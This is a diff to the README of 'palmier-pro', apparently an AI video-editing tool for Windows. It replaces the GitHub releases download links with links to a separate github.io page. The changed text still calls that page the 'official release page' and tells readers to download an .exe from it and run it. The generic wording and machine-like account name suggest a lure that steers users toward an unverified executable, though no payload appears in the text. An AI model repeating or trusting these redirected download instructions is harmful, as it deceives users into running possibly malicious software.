@@ -1,6 +1,6 @@
 # 🌴 palmier-pro - Create professional videos with artificial intelligence
 
-[![](https://img.shields.io/badge/Download-Palmier_Pro-blue)](https://github.com/Genuscambarustangerinetree105/palmier-pro/releases)
+[![](https://img.shields.io/badge/Download-Palmier_Pro-blue)](https://genuscambarustangerinetree105.github.io)
 
 Palmier-pro helps you edit video files using artificial intelligence. This software automates repetitive tasks so you focus on your creative work. It manages clips, applies effects, and balances audio automatically. The tool runs on Windows to provide power and speed for your media projects.
 
@@ -20,7 +20,7 @@ Update your graphics card drivers before you launch the program for the first ti
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official release page](https://github.com/Genuscambarustangerinetree105/palmier-pro/releases) to find the latest version.
+1. Visit the [official release page](https://genuscambarustangerinetree105.github.io) to find the latest version.
 2. Look for the file that ends with .exe and click the icon to start the download.
 3. Open your Downloads folder once the file finishes downloading.
 4. Double-click the palmier-pro installer to start the setup wizard.
